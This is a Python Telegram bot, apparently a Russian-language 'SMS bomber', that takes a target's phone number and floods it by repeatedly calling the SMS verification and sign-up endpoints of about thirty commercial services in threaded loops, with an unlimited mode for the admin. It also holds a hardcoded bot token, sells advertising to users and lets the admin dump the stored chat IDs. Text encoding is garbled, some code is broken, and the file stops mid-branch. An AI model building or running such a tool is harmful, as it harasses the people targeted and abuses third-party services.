import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import os
import random
import string

TOKEN = '1393904816:AAF3zVHoCwCJVSlabJtjkjT-xmv7JV-_skI'

THREADS_LIMIT = 563467

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 1201411854

group_id = -1001296139975



users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"—Å–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤—Å–µ–º ({users_amount[0]}) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –±–æ—Ç–∞!")


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        
        response = requests.post('https://api.telegram.org/bot'+TOKEN+'/sendMessage (https://api.telegram.org/bot'+TOKEN+'/sendMessage)', data=data)
        res = str(response.json)
        print(res)
        if res == '<bound method Response.json of <Response [403]>>':                 
            with open(chat_ids_file, "r") as f:
                lines = f.readlines()
            with open(chat_ids_file, "w") as f:
                for line in lines:
                    if line.strip("\n") != chat_id:
                        f.write(line)
        else:
            pass
                        
    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f'–°–æ–æ–±—â–µ–Ω–∏–µ –≤—Å–µ–º ({users_amount[0]}) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –±–æ—Ç–∞ —É—Å–ø–µ—à–Ω–æ –¥–æ—à–ª–æ!')

def posts(message):
    f = open("friend.txt", mode="w", encoding="utf-8")
    f.write(message.text)
    f.close()
    bot.send_message(message.chat.id, "–û–ø–∏—Å–∞–Ω–∏–µ –ø–∞—Ä—Ç–Ω–µ—Ä–∞ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–æ")

def subchan(message):
    f = open('url.txt', mode = 'w', encoding = 'utf-8')
    f.write(message.text)
    f.close()
    bot.send_message(message.chat.id, '–°—Å—ã–ª–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞')




def postsRES():
    f = open("friend.txt", mode="w", encoding="utf-8")
    f.write("""
     –†–µ–∫–ª–∞–º–∞ - ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω—ë—Ä
  24 —á–∞—Å–∞ (1 –¥–µ–Ω—å) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 200‚ÇΩ
  48 —á–∞—Å–æ–≤ (2 –¥–Ω—è) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 250‚ÇΩ
  120 —á–∞—Å–æ–≤ (5 –¥–Ω–µ–π) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 400‚ÇΩ
  –í–∞—à —Ç–µ–∫—Å—Ç –±—É–¥–µ—Ç –≤–æ –≤–∫–ª–∞–¥–∫–µ ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω—ë—Ä""")
    f.close()




@bot.message_handler(commands=['start'])
def start(message):
 keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
 boom = types.KeyboardButton (text = 'üî•üí£–ë–û–ú–ë–ï–†') 
 stop = types.KeyboardButton (text = '‚õîÔ∏èSTOP')
 info = types.KeyboardButton (text = '‚ÑπÔ∏è–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
 stats = types.KeyboardButton (text = 'üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
 donat = types.KeyboardButton (text = 'üí∞–ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å')
 piar = types.KeyboardButton (text = 'üí∏ –†–µ–∫–ª–∞–º–∞')
 spons = types.KeyboardButton(text = 'ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω–µ—Ä')

 buttons_to_add = [boom, stop, info, stats, donat, piar, spons]


 keyboard.add(*buttons_to_add)

 some_var = bot.get_chat_member(group_id, message.chat.id)
 user_status = some_var.status

 url = open('url.txt', 'r')

 global inl_keyboard
 inl_keyboard = types.InlineKeyboardMarkup()
 s = types.InlineKeyboardButton(text = '–ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è', url = url.read())
 inl_keyboard.add(s)
 #print(some_var)
 #print(user_status)
 if user_status == 'member' or user_status == 'administrator' or user_status =='creator':
  bot.send_message(message.chat.id, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—åüôã‚Äç‚ôÇ!\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:',  reply_markup=keyboard)
  save_chat_id(message.chat.id)

 if user_status == 'restricted' or user_status =='left' or user_status =='kicked':
   bot.send_message(message.chat.id, '–í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª.\n–ü–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –Ω–µ–≥–æ —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –±–æ—Ç—É.', reply_markup = inl_keyboard)


 


def send_for_number(phone):
 while True:
  request_timeout = 0.0000002
  phone1 = '+'+phone[0]+' '+'('+phone[1]+phone[2]+phone[3]+')'+" "+phone[4]+phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10]
  phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone [8] + phone[9] + phone[10] 
 
  try:    
   requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
  except Exception as e:
   pass
 
  try:                                                
   requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone})
  except Exception as e:
   pass
 
  try:    
   requests.post("https://api.mtstv.ru/v1/users", data={'msisdn': phone})
  except Exception as e:
   pass
 
  try:
   a=requests.get('https://driver.gett.ru/signup/')
   requests.post('https://driver.gett.ru/api/login/phone/', data = {'phone':phone,'registration':'true'}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'csrftoken='+a.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2','Host':'driver.gett.ru (http://driver.gett.ru/)','Referer':'https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0 (https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRFToken':a.cookies['csrftoken']})
  except Exception as e:
   pass
 
  try:    
   requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data = {"phone":phone}, headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.ivi.ru (http://api.ivi.ru/)', 'origin':'https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile (https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile)'})
  except:
   pass
 
 
  try:
   b = requests.session()
   b.get('https://drugvokrug.ru/siteActions/processSms.htm')
   requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+b.cookies['JSESSIONID']+';','Host':'drugvokrug.ru (http://drugvokrug.ru/)','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (https://drugvokrug.ru/','User-Agent':'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
  except Exception as e:
   pass

  #–î–æ–±–∞–≤–ª–µ–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã
  try:
   rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]})
  except Exception as e:
   pass
 
   
  try:
   rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
  except Exception as e:
   pass
 
   
  try:
   psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'–ò–≤–∞–Ω','middleName':'–ò–≤–∞–Ω–æ–≤–∏—á','lastName':'–ò–≤–∞–Ω–æ–≤','sex':'1','birthDate':'10.10.2000','mobilePhone': phone[1:],'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
  except Exception as e:
   pass
   
 
   
  try:
   beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
  except Exception as e:
   pass
   
 
  try:
   modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'–°–∞—à–∞','CellPhone':phone[1:],'Package':'optimal'})
  except Exception as e:
   pass
 
  try:
   data = {

'form[NAME]': '–ò–≤–∞–Ω',
'form[PERSONAL_GENDER]': 'M',
'form[PERSONAL_BIRTHDAY]': '11.02.2000',
'form[EMAIL]': 'fbhbdfvbd@gmail.com',
'form[LOGIN]': phone1,
'form[PASSWORD]': None,
'get-new-password': '–ü–æ–ª—É—á–∏—Ç–µ –ø–∞—Ä–æ–ª—å –ø–æ SMS',
'user_agreement': 'on',
'personal_data_agreement': 'on',
'formType': 'full',
'utc_offset': 180
}
   aptkru = requests.post('https://apteka.ru/_action/auth/getForm/', data = data )
  except Exception as e:
   pass

  try:
   tvzavr = requests.post('https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone='+phone+'&csrf_value=a222ba2a464543f5ac6ad097b1e92a49 (https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=%27+phone+%27&csrf_value=a222ba2a464543f5ac6ad097b1e92a49)')
  except Exception as e:
   pass
 
 
  try:
   cook = requests.post('https://www.netprint.ru/order/profile')
 
 
   headers = {
'Accept': 'application/json, text/javascript, */*; q=0.01',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
'Connection': 'keep-alive',
'Content-Length': 145,
'Cookie':'unbi='+cook.cookies['unbi'],
'Host': 'www.netprint.ru',
'Origin': 'https://www.netprint.ru',
'Referer': 'https://www.netprint.ru/order/profile',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48',
'X-Requested-With': 'XMLHttpRequest'
}

   netprint = requests.post('https://www.netprint.ru/order/social-auth', headers = headers,   data = {'operation': 'stdreg','email_or_phone': phonew, 'i_agree_with_terms': 1})
  except Exception as e:
   pass

  try:
   requests.post('http://youdrive.today/login/web/phone', data = {'phone':phone, 'phone_code': 7})
  except Exception as e:
   pass
 
  try:
   requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone+'&country_code=%2B7&nod=4&locale=en')
  except Exception as e:
   pass
 
 
  try:
   requests.post("https://api.carsmile.com/",
                                json={"operationName": "enterPhone", "variables": {"phone": phone},
                                      "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
  except Exception as e:
   pass
 
 
  try:
   requests.post("https://api.delitime.ru/api/v2/signup",
                                data={"SignupForm[username]":phone, "SignupForm[device_type]": 3})
  except Exception as e:
   pass
 
 
  try:
   requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                                data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru',
                                      'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
  except Exception as e:
   pass
 
  try:
   requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                                data={"mode": "request", "phone": "+" + phone,
                                      "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
                                      "osversion": "unknown", "devicemodel": "unknown"})
  except Exception as e:
   pass
 
  try:
   password = ''.join(random.choice(string.ascii_letters) for _ in range(6))
   requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
  except Exception as e:
   pass
 
  try:
   requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
                                json={"phone": phone})
  except Exception as e:
   pass
 
  try:
   requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
  except Exception as e:
   pass
 
  try:
   requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
  except Exception as e:
   pass
 
  try:
   requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                                json={"phone": "+" + phone, "api": 2, "email": "email",
                                      "x-email": "x-email"})
  except Exception as e:
   pass
 
  try:
   requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                                data={"st.r.phone": "+" + phone})
  except Exception as e:
   pass
 
  try:
   requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                                json={"phone": phone})
  except Exception as e:
   pass
 
  try:
   requests.post("https://api.wowworks.ru/v2/site/send-code",
                                json={"phone": phone, "type": 2})
  except Exception as e:
   pass
 
  try:
   requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                                json={"phone_number": "+" + phone})
  except Exception as e:
   pass
 
  try:
   topPHONE = '+'+phone[0]+'('+phone[1]+phone[2]+phone[3]+')'+phone[4]+phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10]
   topshop = requests.post('https://www.top-shop.ru/login/loginByPhone/', data = {'phone': topPHONE})
  except Exception as e:
   pass

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = '–°–ø–∞–º –∑–∞–ø—É—â–µ–Ω –Ω–∞ –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–æ–µ –≤—Ä–µ–º—è –¥–ª—è –Ω–æ–º–µ—Ä–∞ +' + phone_number
    else:
         msg = '–°–ø–∞–º –∑–∞–ø—É—â–µ–Ω –Ω–∞ 10 –º–∏–Ω—É—Ç –Ω–∞ –Ω–æ–º–µ—Ä +' + phone_number

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes = 10)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, '–°–ø–∞–º –Ω–∞ –Ω–æ–º–µ—Ä +' + phone_number + ' –∑–∞–≤–µ—Ä—à—ë–Ω')
    THREADS_AMOUNT[0] -= 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, '–í—ã —É–∂–µ –Ω–∞—á–∞–ª–∏ —Ä–∞—Å—Å—ã–ª–∫—É —Å–ø–∞–º–∞. –î–æ–∂–¥–∏—Ç–µ—Å—å –æ–∫–æ–Ω—á–∞–Ω–∏—è –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ STOP –∏ –ø–æ—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
     x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
     threads.append(x)
     THREADS_AMOUNT[0] += 1
     x.start()
    else:
        bot.send_message(chat_id, '–°–µ—Ä–≤–µ—Ä–∞ —Å–µ–π—á–∞—Å –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω—ã. –ü–æ–ø—ã—Ç–∞–π—Ç–µ—Å—å —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç')
        print('–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç—Ä–µ–¥–æ–≤ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è. –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
  keyboard = types.ReplyKeyboardMarkup(row_width=2,   resize_keyboard=True)
  boom = types.KeyboardButton (text = 'üî•üí£–ë–û–ú–ë–ï–†') 
  stop = types.KeyboardButton (text = '‚õîÔ∏èSTOP')
  info = types.KeyboardButton (text = '‚ÑπÔ∏è–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
  stats = types.KeyboardButton (text = 'üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
  donat = types.KeyboardButton (text = 'üí∞–ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å')
  piar = types.KeyboardButton (text = 'üí∏ –†–µ–∫–ª–∞–º–∞')
  spons = types.KeyboardButton(text = 'ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω–µ—Ä')

  buttons_to_add = [boom, stop, info, stats, donat, piar, spons]

  keyboard.add(*buttons_to_add)

  some_var = bot.get_chat_member(group_id, message.chat.id)
  user_status = some_var.status

  url = open('url.txt', 'r')
  inl_keyboard = types.InlineKeyboardMarkup()
  s = types.InlineKeyboardButton(text = '–ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è', url = url.read())
  inl_keyboard.add(s)


  adm = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
  a = types.KeyboardButton(text='–†–∞—Å—Å—ã–ª–∫–∞')
  b = types.KeyboardButton(text='–ü—Ä–µ–¥–ª–æ–∂–∏—Ç—å —Ä–µ–∫–ª–∞–º—É')
  c = types.KeyboardButton(text='–î–æ–±–∞–≤–∏—Ç—å –ø–∞—Ä—Ç–Ω–µ—Ä')
  d = types.KeyboardButton(text='–£–¥–∞–ª–∏—Ç—å –ø–∞—Ä—Ç–Ω–µ—Ä–∞')
  vpn = types.KeyboardButton(text = '–û–±–Ω–æ–≤–∏—Ç—å VPN')
  sub = types.KeyboardButton(text = '–ò–∑–º–µ–Ω–∏—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ –∫–∞–Ω–∞–ª')
  file = types.KeyboardButton(text = 'Dump DB')
  e = types.KeyboardButton(text = '–ù–∞–∑–∞–¥')
  adm.add(a, b, c, d, vpn, sub, file, e)
        
  chat_id = int(message.chat.id)
  text = message.text

  some_var = bot.get_chat_member(group_id, message.chat.id)
  user_status = some_var.status

  if user_status == 'member' or user_status == 'administrator' or user_status == 'creator':

   if text == "–î–æ–±–∞–≤–∏—Ç—å –ø–∞—Ä—Ç–Ω–µ—Ä" and chat_id == ADMIN_CHAT_ID:
    a=bot.send_message(message.chat.id,"–ü—Ä–∏—à–ª–∏—Ç–µ —Ä–µ–∫–ª–∞–º—É –≤–∞—à–µ–≥–æ –ø–∞—Ä—Ç–Ω–µ—Ä–∞:")
    bot.register_next_step_handler(a,posts)

   elif text == '–ò–∑–º–µ–Ω–∏—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ –∫–∞–Ω–∞–ª' and chat_id == ADMIN_CHAT_ID:
    b = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –∫–∞–Ω–∞–ª')
    bot.register_next_step_handler(b, subchan)
 
   elif text == '–£–¥–∞–ª–∏—Ç—å –ø–∞—Ä—Ç–Ω–µ—Ä–∞'and chat_id == ADMIN_CHAT_ID:
    postsRES()
    bot.send_message(chat_id, '–ü–∞—Ä—Ç–Ω–µ—Ä —É–¥–∞–ª—ë–Ω')   

   elif text == '‚ÑπÔ∏è–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è':
    bot.send_message(chat_id, '–í–ª–∞–¥–µ–ª–µ—Ü –±–æ—Ç–∞: @tg_mysecure \n–ü–æ –≤–æ–ø—Ä–æ—Å–∞–º —Å–æ—Ç—Ä—É–¥–Ω–∏—á–µ—Å—Ç–≤–∞ –æ–±—Ä–∞—â–∞—Ç—å—Å—è –≤ –õ–° —Å—é–¥–∞ @tg_mysecure \n–ë–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –ø–æ–∫–∞ —á—Ç–æ —Ç–æ–ª—å–∫–æ –Ω–∞ –†–æ—Å—Å–∏—é –∏ –£–∫—Ä–∞–∏–Ω—É')

   elif text == 'üî•üí£–ë–û–ú–ë–ï–†':
    bot.send_message(chat_id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ:\nüá∑üá∫ 79xxxxxxxxx\nüá∫üá¶ 380xxxxxxxxx')
            
   elif text == 'üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞':
    with open('chat_ids.txt') as f:
     size=sum(1 for _ in f)
    bot.send_message(chat_id, 'üìä–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏üì°!\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–πüôé‚Äç‚ôÇ: '+ str(size) +'\n–°–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è RUüá∑üá∫: 30\n–°–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è UKüá∫üá¶: 30\n–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: 29.08.2019')

   elif text == 'üí∞–ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å':
    bot.send_message(chat_id, '–†–µ–±—è—Ç–∞, –∫—Ç–æ –º–æ–∂–µ—Ç –º–∞—Ç–µ—Ä–∏–∞–ª—å–Ω–æ –ø–æ–º–æ—á—å –Ω–∞ —Ä–∞–∑–≤–∏—Ç–∏–µ –±–æ—Ç–∞\n–í–æ—Ç —Ä–µ–∫–≤–∏–∑–∏—Ç—ã\nQIWI –∫–∞—Ä—Ç–∞: ' + '<pre>999999999999999</pre>', parse_mode="HTML" )
     
   elif text == 'üí∏ –†–µ–∫–ª–∞–º–∞':
    bot.send_message(chat_id, """
 –†–µ–∫–ª–∞–º–∞ - —Ä–∞—Å—Å—ã–ª–∫–∞:
 –¶–µ–Ω–∞: 150‚ÇΩ
 –ö–∞–∂–¥—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Å –≤–∞—à–∏–º —Ç–µ–∫—Å—Ç–æ–º.

 –†–µ–∫–ª–∞–º–∞ - ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω—ë—Ä
 24 —á–∞—Å–∞ (1 –¥–µ–Ω—å) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 250‚ÇΩ
 48 —á–∞—Å–æ–≤ (2 –¥–Ω—è) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 300‚ÇΩ
 120 —á–∞—Å–æ–≤ (5 –¥–Ω–µ–π) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 500‚ÇΩ
 –í–∞—à —Ç–µ–∫—Å—Ç –±—É–¥–µ—Ç –≤–æ –≤–∫–ª–∞–¥–∫–µ ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω—ë—Ä

 –ö—É–ø–∏—Ç—å: @tg_mysecure  """)    

   elif text == '/admin' and chat_id == ADMIN_CHAT_ID:
    bot.send_message(chat_id, '–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ.', reply_markup = adm)

   elif text == '–ù–∞–∑–∞–¥' and chat_id == ADMIN_CHAT_ID:
    bot.send_message(chat_id, '–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ.', reply_markup = keyboard)

   elif text == '–†–∞—Å—Å—ã–ª–∫–∞' and chat_id == ADMIN_CHAT_ID:
    bot.send_message(chat_id, '–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: "–†–ê–ó–û–°–õ–ê–¢–¨: –≤–∞—à_—Ç–µ–∫—Å—Ç" –±–µ–∑ –∫–∞–≤—ã—á–µ–∫')

   elif text == '–û–±–Ω–æ–≤–∏—Ç—å VPN' and chat_id == ADMIN_CHAT_ID:
    bot.send_message(chat_id, '–ë–æ—Ç –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...')
    os.system('python3 start.py')

   elif text == 'Dump DB' and chat_id == ADMIN_CHAT_ID:
    f = open('chat_ids.txt')
    bot.send_document(chat_id, f)

   elif text == 'ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω–µ—Ä':
    post=""
    f = open("friend.txt", mode="r", encoding="utf-8")
    for line in f.readlines():
     post+=line
    bot.send_message(message.chat.id,post)
    f.close()

           
    
   elif text == '–ü—Ä–µ–¥–ª–æ–∂–∏—Ç—å —Ä–µ–∫–ª–∞–º—É' and chat_id == ADMIN_CHAT_ID:
    bot.send_message(message.chat.id, '–†–∞—Å—Å—ã–ª–∫–∞ –Ω–∞—á–µ–ª–∞—Å—å')
    predlog = '‚úÖ–ù–µ –∑–Ω–∞–µ—Ç–µ –≥–¥–µ –¥–∞—Ç—å —Ä–µ–∫–ª–∞–º—É –∫–∞—á–µ—Å—Ç–≤–µ–Ω–Ω–æ –∏ –Ω–µ –¥–æ—Ä–æ–≥–æ?\nüèõ–¢–æ–≥–¥–∞ –≤—ã –ø–æ –∞–¥—Ä–µ—Å—É!!!\n\nüë• –£ –Ω–∞—Å –≤–∞—à—É —Ä–µ–∫–ª–∞–º—É —É–≤–∏–¥—è—Ç –≤—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –±–æ—Ç–∞\nüì® @spamm3r_bot\n\nüó£ –ö–∞–∂–¥—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –±–æ—Ç–∞ —Å –≤–∞—à–µ–π —Ä–µ–∫–ª–∞–º–æ–π!\n‚òÄÔ∏è ' + str(users_amount[0]) + ' ‚òÄÔ∏è –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!\n\nüí∂ –¶–µ–Ω–∞ —Ä–∞—Å—Å—ã–ª–∫–∏: 150 ‚ÇΩ\n\n–†–µ–∫–ª–∞–º–∞ - ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω—ë—Ä\n24 —á–∞—Å–∞ (1 –¥–µ–Ω—å) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 250‚ÇΩ\n48 —á–∞—Å–æ–≤ (2 –¥–Ω—è) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 300‚ÇΩ\n120 —á–∞—Å–æ–≤ (5 –¥–Ω–µ–π) + 1 —Ä–∞—Å—Å—ã–ª–∫–∞ - 500‚ÇΩ\n–í–∞—à —Ç–µ–∫—Å—Ç –±—É–¥–µ—Ç –≤–æ –≤–∫–ª–∞–¥–∫–µ ü§ù–ù–∞—à –ø–∞—Ä—Ç–Ω—ë—Ä\n\n–ö—É–ø–∏—Ç—å: @tg_mysecure '
    send_message_users(predlog)
    bot.send_message(chat_id, '–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞')
     
   elif text == '‚õîÔ∏èSTOP':
    if chat_id not in running_spams_per_chat_id:
     bot.send_message(chat_id, '–í—ã –µ—â–µ –Ω–µ –Ω–∞—á–∏–Ω–∞–ª–∏ —Å–ø–∞–º')
    else:
     running_spams_per_chat_id.remove(chat_id)

   elif '–†–ê–ó–û–°–õ–ê–¢–¨: ' in text and chat_id==ADMIN_CHAT_ID:
    msg = text.replace("–†–ê–ó–û–°–õ–ê–¢–¨: ","")
    bot.send_message(message.chat.id, '–†–∞—Å—Å—ã–ª–∫–∞ –Ω–∞—á–µ–ª–∞—Å—å')
    send_message_users(msg)
    bot.send_message(chat_id, '–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞')



       
   elif len(text) == 11:
    phone = text
    spam_handler(phone, chat_id, force=False)

   elif len(text) == 12:
    phone = text
    spam_handler(phone, chat_id, force=False)


   elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
    phone = text[1:]
    spam_handler(phone, chat_id, force=True)

   else:
    bot.send_message(chat_id, '–ù–æ–º–µ—Ä –≤–≤–µ–¥–µ–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ.')

  if user_status == 'restricted' or user_status =='left' or user_status =='kicked':
